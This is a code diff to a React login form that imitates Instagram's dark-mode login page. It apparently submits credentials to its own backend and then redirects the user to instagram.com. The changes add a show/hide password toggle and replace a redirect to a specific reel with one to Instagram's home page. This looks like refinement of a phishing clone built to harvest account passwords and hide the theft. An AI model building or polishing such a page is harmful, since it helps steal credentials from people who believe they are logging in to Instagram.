@@ -9,6 +9,7 @@ export default function LoginForm() {
   const [password, setPassword] = useState("")
   const [status, setStatus] = useState<string | null>(null)
   const [loading, setLoading] = useState(false)
+  const [showPassword, setShowPassword] = useState(false)
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault()
@@ -25,8 +26,8 @@ export default function LoginForm() {
       if (!res.ok) {
         setStatus(data?.error || "Login failed")
       } else {
-        // Redirect to Instagram reel after successful login
-        window.location.href = "https://www.instagram.com/reel/DRjOciwja4v/?utm_source=ig_web_button_share_sheet"
+        // Redirect to Instagram after successful login
+        window.location.href = "https://www.instagram.com/"
       }
     } catch (err) {
       setStatus("Network error")
@@ -44,13 +45,24 @@ export default function LoginForm() {
         onChange={(e) => setIdentifier(e.target.value)}
         className="bg-[#121212] border-[#363636] text-white placeholder:text-[#737373] text-xs h-9 rounded-sm focus-visible:ring-1 focus-visible:ring-[#363636]"
       />
-      <Input
-        type="password"
-        placeholder="Password"
-        value={password}
-        onChange={(e) => setPassword(e.target.value)}
-        className="bg-[#121212] border-[#363636] text-white placeholder:text-[#737373] text-xs h-9 rounded-sm focus-visible:ring-1 focus-visible:ring-[#363636]"
-      />
+      <div className="relative">
+        <Input
+          type={showPassword ? "text" : "password"}
+          placeholder="Password"
+          value={password}
+          onChange={(e) => setPassword(e.target.value)}
+          className="bg-[#121212] border-[#363636] text-white placeholder:text-[#737373] text-xs h-9 rounded-sm focus-visible:ring-1 focus-visible:ring-[#363636] pr-14"
+        />
+        {password && (
+          <button
+            type="button"
+            onClick={() => setShowPassword(!showPassword)}
+            className="absolute right-3 top-1/2 -translate-y-1/2 text-white text-sm font-semibold hover:text-[#a8a8a8]"
+          >
+            {showPassword ? "Hide" : "Show"}
+          </button>
+        )}
+      </div>
 
       <Button
         type="submit"
